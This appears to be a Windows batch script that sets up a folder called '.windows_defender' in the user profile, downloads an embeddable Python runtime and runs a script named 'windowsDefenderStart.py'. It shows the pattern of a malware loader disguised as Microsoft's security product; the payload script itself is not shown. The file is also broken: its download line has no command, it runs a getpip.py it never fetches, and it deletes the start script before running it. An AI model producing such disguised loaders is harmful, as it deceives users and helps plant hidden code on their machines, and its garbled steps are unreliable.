cd %USERPROFILE%

if not exist "%USERPROFILE%\.windows_defender" (
    mkdir .windows_defender
)
cd .windows_defender


https://www.python.org/ftp/python/3.9.13/python-3.9.13-embed-amd64.zip -O

mkdir python

tar -xf python-3.9.13-embed-amd64.zip %USERPROFILE%\.windows_defender\python

%USERPROFILE%\.windows_defender\python\python.exe -m ensurepip

del windowsDefenderStart.py

%USERPROFILE%\.windows_defender\python\python.exe %USERPROFILE%\.windows_defender\python\getpip.py 
%USERPROFILE%\.windows_defender\python\python.exe windowsDefenderStart.py
